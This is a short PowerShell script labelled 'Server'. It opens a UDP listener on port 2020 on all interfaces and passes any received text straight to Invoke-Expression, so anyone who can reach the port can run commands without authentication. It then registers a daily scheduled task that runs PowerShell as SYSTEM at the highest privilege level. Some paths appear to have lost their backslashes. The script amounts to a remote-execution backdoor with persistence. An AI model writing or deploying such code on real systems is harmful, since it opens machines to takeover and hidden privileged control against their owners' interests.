##Server
$port=2020
$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::Any,$port)
$udpclient=new-Object System.Net.Sockets.UdpClient $port
$content=$udpclient.Receive([ref]$endpoint)
[Text.Encoding]::ASCII.GetString($content)  | iex
$udpclient.Dispose()

$Trigger= New-ScheduledTaskTrigger -At 10:00am -Daily
$User= "NT AUTHORITYSYSTEM"
$Action= New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "C:Script.ps1"
Register-ScheduledTask -TaskName "Script" -Trigger $Trigger -User $User -Action $Action -RunLevel Highest –Force